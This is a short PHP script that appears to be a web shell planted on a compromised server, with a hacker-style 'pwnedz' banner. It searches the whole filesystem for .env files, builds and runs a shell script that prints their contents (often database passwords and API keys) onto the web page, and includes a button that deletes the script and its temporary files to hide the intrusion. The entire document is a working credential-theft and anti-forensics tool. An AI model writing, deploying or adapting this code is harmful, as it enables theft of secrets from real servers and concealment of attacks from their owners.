<?php
$asu	= shell_exec("find / -name *.env | grep -v 'Permission denied'");
echo '<font color=purple>r00t@trenggalek6etar:</font>~/pwnedz$</font><br>';
echo 'DIR : <font color=red>'.getcwd().'</font><br>';
echo '<textarea name="jembot" cols="150" rows="10" id="jembot">'.$asu.'</textarea><br>';
$fh = fopen('filene.txt', 'w');
fwrite($fh,$asu);
system("sed 's/^/cat /;' filene.txt > gas.sh");
$response = shell_exec("chmod +x gas.sh; bash gas.sh");
echo '<textarea name="jembot" cols="150" rows="10" id="jembot">'.$response.'</textarea><br>';
?>
<?php
if(isset($_POST['delete']))
    {
        unlink(__FILE__);
		unlink("filene.txt");
		unlink("gas.sh");
		echo "sukses bro";
    }
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <body>
        <form action="suw.php" method="post">
            <p>
            <button type="delete" name="delete" id="delete" value="delete">Raimu</button>
            </p>
        </form>
    </body>
</html>